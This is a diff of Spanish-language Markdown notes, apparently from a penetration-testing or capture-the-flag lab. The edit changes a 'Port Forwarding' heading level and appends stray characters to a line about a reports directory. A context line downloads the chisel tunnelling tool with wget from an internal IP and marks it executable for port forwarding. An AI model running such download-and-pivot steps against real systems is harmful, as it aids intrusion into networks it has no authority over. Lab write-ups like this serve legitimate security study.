@@ -371,7 +371,7 @@ wget http://192.168.226.5/chisel
 chmod +x chisel
 ```
 
-#### Port Forwarding
+### Port Forwarding
 
 Para realizar port forwarding y para tener mas informacion de realizarlo podemos revisar el siguiente sitio web:
 
@@ -398,7 +398,7 @@ en este directorio podemos ver que se están cargando los CV en formato PDF del 
 ![[Pasted image 20240908135424.png]]
 
 `reports Directory`
-en este directorio podemos ver un reporte en formato pdf
+en este directorio podemos ver un reporte en formato pdf `asdasdasdasd
 ![[Pasted image 20240908135502.png]]
 
 `Server Status Report`
